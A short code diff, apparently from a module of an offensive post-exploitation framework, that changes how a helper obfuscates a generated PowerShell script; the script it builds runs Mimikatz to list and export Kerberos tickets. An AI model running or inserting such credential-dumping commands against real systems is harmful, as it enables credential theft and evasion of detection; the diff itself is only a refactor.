@@ -72,6 +72,6 @@ class Module:
 
         scriptEnd = "Invoke-Mimikatz -Command '\"standard::base64\" \"kerberos::list /export\"'"
         if obfuscate:
-            scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
         return script
